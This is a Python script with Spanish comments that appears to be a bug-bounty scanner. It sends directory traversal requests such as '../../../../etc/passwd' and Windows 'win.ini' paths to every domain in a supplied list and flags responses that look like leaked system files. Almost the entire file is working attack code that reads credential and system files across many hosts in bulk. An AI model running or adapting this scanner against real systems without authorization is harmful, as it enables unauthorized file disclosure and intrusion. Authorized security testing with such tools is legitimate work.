import requests
import argparse

# Clase para manejar colores
class Colores:
    VERDE = '\033[92m'  # Verde
    ROJO = '\033[91m'   # Rojo
    AMARILLO = '\033[93m'  # Amarillo
    RESET = '\033[0m'   # Resetear colores

def imprimir_banner():
    """Imprime un banner de bienvenida."""
    banner = r"""
     _____   _             ___     __    __   ___               ___   _         _ 
    |_   _| | |_    ___   / _ \   / _|  / _| / __|  ___   __   / __| (_)  _ _  | |
      | |   | ' \  / -_) | (_) | |  _| |  _| \__ \ / -_) / _| | (_ | | | | '_| | |
      |_|   |_||_| \___|  \___/  |_|   |_|   |___/ \___| \__|  \___| |_| |_|   |_|
    """
    print(Colores.VERDE + banner + Colores.RESET)

# Configurar los argumentos de línea de comandos
parser = argparse.ArgumentParser(description="Prueba Directory Traversal y Local File Disclosure en múltiples dominios.")
parser.add_argument("-L", "--list", required=True, help="Ruta al archivo que contiene la lista de dominios.")
parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; bounty-checker/1.0; +http://your-hackerone-email)", help="User-Agent para la solicitud.")
parser.add_argument("-t", "--timeout", type=int, default=5, help="Tiempo de espera (en segundos) para cada solicitud.")

args = parser.parse_args()

# Imprimir el banner al inicio
imprimir_banner()

# Cargar dominios desde el archivo especificado
with open(args.list, 'r') as f:
    domains = [line.strip() for line in f if line.strip()]

# Rutas de Directory Traversal comunes
traversal_paths = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts"
]

# Configuración de encabezados
headers = {
    "User-Agent": args.agent
}

# Iterar sobre cada dominio y probar cada ruta de Directory Traversal
for domain in domains:
    print(f"\n--- Probando en el dominio: {domain} ---")
    for path in traversal_paths:
        try:
            # Combinar la URL base con la ruta, asegurando que haya una sola barra
            full_url = f"{domain.rstrip('/')}/{path.lstrip('/')}"
            response = requests.get(full_url, headers=headers, timeout=args.timeout)

            # Verificación básica de éxito en LFD
            if "root:" in response.text or "localhost" in response.text:
                print(Colores.VERDE + f"[+] Posible LFD encontrado en {full_url}:\n{response.text[:200]}" + Colores.RESET)  # Limita a 200 caracteres
            else:
                print(Colores.ROJO + f"[-] No vulnerable con el path {path}" + Colores.RESET)
        except requests.RequestException as e:
            print(Colores.AMARILLO + f"[!] Error al acceder a {full_url}: {e}" + Colores.RESET)
